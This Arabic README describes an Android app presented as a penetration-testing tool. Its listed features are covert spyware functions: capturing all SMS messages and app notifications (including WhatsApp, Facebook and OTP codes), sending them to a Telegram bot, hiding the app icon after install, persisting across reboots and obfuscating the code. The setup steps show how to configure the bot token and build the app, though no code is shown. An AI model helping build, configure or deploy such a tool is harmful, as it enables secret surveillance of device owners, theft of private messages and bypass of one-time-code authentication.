## 📋 الوصف

أداة متطورة مخصصة لاختبارات الاختراق وتقييم أمن أجهزة أندرويد. تلتقط الرسائل النصية والإشعارات وترسلها عبر Telegram Bot API.

## 🎯 الميزات

| الميزة | الوصف |
|--------|-------|
| 📩 التقاط SMS | يلتقط جميع الرسائل فور وصولها بأعلى أولوية |
| 🔔 التقاط الإشعارات | يرصد إشعارات جميع التطبيقات (واتساب، فيسبوك، رموز OTP...) |
| 🤖 تسريب عبر Telegram | إرسال آمن ومشفر عبر Telegram Bot API |
| 👻 إخفاء تلقائي | يخفي الأيقونة بعد التثبيت مباشرة |
| 🔄 ثبات كامل | يعمل بعد إعادة التشغيل تلقائياً |
| 🧩 تجميع الرسائل | يجمع الإشعارات المتقاربة لتقليل الطلبات |
| 🔐 تشويش الكود | ProGuard للنسخة النهائية |

## 🛠️ المتطلبات

- Android 7.0+ (API 24+)
- اتصال إنترنت
- بوت Telegram

## ⚙️ الإعداد

1. أنشئ بوت Telegram عبر [@BotFather](https://t.me/BotFather)
2. احصل على `BOT_TOKEN` و `CHAT_ID`
3. استبدل القيم في ملف `TelegramBot.kt`
4. ابنِ التطبيق
